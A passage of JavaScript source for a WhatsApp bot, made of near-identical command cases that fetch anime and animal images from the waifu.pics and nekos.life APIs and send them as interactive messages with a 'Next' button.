        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animetickle': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
